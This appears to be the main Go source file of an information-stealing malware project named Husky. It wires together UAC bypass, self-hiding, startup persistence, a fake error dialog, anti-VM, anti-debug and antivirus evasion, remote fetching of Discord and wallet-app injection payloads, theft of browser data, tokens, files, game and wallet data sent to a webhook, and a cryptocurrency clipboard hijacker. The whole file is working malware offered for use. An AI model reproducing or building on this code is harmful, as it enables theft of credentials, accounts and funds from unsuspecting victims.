package main

import (
	"github.com/TheHuskyDev/Husky/src/antidebug"
	"github.com/TheHuskyDev/Husky/src/antivm"
	"github.com/TheHuskyDev/Husky/src/antivirus"
	"github.com/TheHuskyDev/Husky/src/browsers"
	"github.com/TheHuskyDev/Husky/src/clipper"
	"github.com/TheHuskyDev/Husky/src/commonfiles"
	"github.com/TheHuskyDev/Husky/src/discodes"
	"github.com/TheHuskyDev/Husky/src/discordinjection"
	"github.com/TheHuskyDev/Husky/v/fakeerror"
	"github.com/TheHuskyDev/Husky/src/games"
	"github.com/TheHuskyDev/Husky/src/hideconsole"
	"github.com/TheHuskyDev/Husky/src/startup"
	"github.com/TheHuskyDev/Husky/src/system"
	"github.com/TheHuskyDev/Husky/src/tokens"
	"github.com/TheHuskyDev/Husky/src/uacbypass"
	"github.com/TheHuskyDev/Husky/src/wallets"
	"github.com/TheHuskyDev/Husky/src/walletsinjection"
	"github.com/TheHuskyDev/Husky/utils/program"
)

func main() {
	CONFIG := map[string]interface{}{
		"webhook": "",
		"cryptos": map[string]string{
			"BTC": "",
			"BCH": "",
			"ETH": "",
			"XMR": "",
			"LTC": "",
			"XCH": "",
			"XLM": "",
			"TRX": "",
			"ADA": "",
			"DASH": "",
			"DOGE": "",
		},
	}

	if program.IsAlreadyRunning() {
		return
	}

	uacbypass.Run()

	hideconsole.Run()
	program.HideSelf()

	if !program.IsInStartupPath() {
		go fakeerror.Run()
		go startup.Run()
	}

	antivm.Run()
	go antidebug.Run()
	go antivirus.Run()

	go discordinjection.Run(
		"https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
		CONFIG["webhook"].(string),
	)
	go walletsinjection.Run(
		"https://github.com/hackirby/wallets-injection/raw/main/atomic.asar",
		"https://github.com/hackirby/wallets-injection/raw/main/exodus.asar",
		CONFIG["webhook"].(string),
	)

	actions := []func(string){
		system.Run,
		browsers.Run,
		tokens.Run,
		discodes.Run,
		commonfiles.Run,
		wallets.Run,
		games.Run,
	}

	for _, action := range actions {
		go action(CONFIG["webhook"].(string))
	}

	clipper.Run(CONFIG["cryptos"].(map[string]string))
}
